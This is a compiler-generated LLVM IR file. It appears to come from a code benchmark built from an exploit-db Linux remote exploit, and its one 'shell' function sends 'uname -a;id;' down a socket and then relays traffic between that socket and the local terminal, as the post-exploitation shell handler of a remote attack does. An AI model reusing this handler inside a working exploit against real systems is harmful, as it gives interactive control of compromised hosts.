; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_55.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_55.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [14 x i8] c"uname -a;id;\0A\00", align 1
@.str.1 = private unnamed_addr constant [20 x i8] c"Connection closed.\0A\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i8] c"read remote\00", align 1
@.str.3 = private unnamed_addr constant [10 x i8] c"read user\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca [1024 x i8], align 16
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  store i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str, i64 0, i64 0), i8** %5, align 8
  %7 = load i32, i32* %2, align 4
  %8 = load i8*, i8** %5, align 8
  %9 = load i8*, i8** %5, align 8
  %10 = call i32 @strlen(i8* %9)
  %11 = call i32 @send(i32 %7, i8* %8, i32 %10, i32 0)
  br label %12

12:                                               ; preds = %1, %63
  %13 = load i32, i32* %2, align 4
  %14 = call i32 @FD_SET(i32 %13, i32* %3)
  %15 = call i32 @FD_SET(i32 0, i32* %3)
  %16 = load i32, i32* %2, align 4
  %17 = add nsw i32 %16, 1
  %18 = call i64 @select(i32 %17, i32* %3, i32* null, i32* null, i32* null)
  %19 = icmp slt i64 %18, 0
  br i1 %19, label %20, label %21

20:                                               ; preds = %12
  br label %64

21:                                               ; preds = %12
  %22 = load i32, i32* %2, align 4
  %23 = call i64 @FD_ISSET(i32 %22, i32* %3)
  %24 = icmp ne i64 %23, 0
  br i1 %24, label %25, label %47

25:                                               ; preds = %21
  %26 = load i32, i32* %2, align 4
  %27 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %28 = call i32 @read(i32 %26, i8* %27, i32 1024)
  store i32 %28, i32* %6, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp eq i32 %29, 0
  br i1 %30, label %31, label %35

31:                                               ; preds = %25
  %32 = call i32 @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.1, i64 0, i64 0))
  %33 = load i32, i32* @EXIT_FAILURE, align 4
  %34 = call i32 @exit(i32 %33) #3
  unreachable

35:                                               ; preds = %25
  %36 = load i32, i32* %6, align 4
  %37 = icmp slt i32 %36, 0
  br i1 %37, label %38, label %42

38:                                               ; preds = %35
  %39 = call i32 @perror(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  %40 = load i32, i32* @EXIT_FAILURE, align 4
  %41 = call i32 @exit(i32 %40) #3
  unreachable

42:                                               ; preds = %35
  br label %43

43:                                               ; preds = %42
  %44 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %45 = load i32, i32* %6, align 4
  %46 = call i32 @write(i32 1, i8* %44, i32 %45)
  br label %47

47:                                               ; preds = %43, %21
  %48 = call i64 @FD_ISSET(i32 0, i32* %3)
  %49 = icmp ne i64 %48, 0
  br i1 %49, label %50, label %63

50:                                               ; preds = %47
  %51 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %52 = call i32 @read(i32 0, i8* %51, i32 1024)
  store i32 %52, i32* %6, align 4
  %53 = icmp sle i32 %52, 0
  br i1 %53, label %54, label %58

54:                                               ; preds = %50
  %55 = call i32 @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.3, i64 0, i64 0))
  %56 = load i32, i32* @EXIT_FAILURE, align 4
  %57 = call i32 @exit(i32 %56) #3
  unreachable

58:                                               ; preds = %50
  %59 = load i32, i32* %2, align 4
  %60 = getelementptr inbounds [1024 x i8], [1024 x i8]* %4, i64 0, i64 0
  %61 = load i32, i32* %6, align 4
  %62 = call i32 @write(i32 %59, i8* %60, i32 %61)
  br label %63

63:                                               ; preds = %58, %47
  br label %12

64:                                               ; preds = %20
  %65 = load i32, i32* %2, align 4
  %66 = call i32 @close(i32 %65)
  ret void
}

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @perror(i8*) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
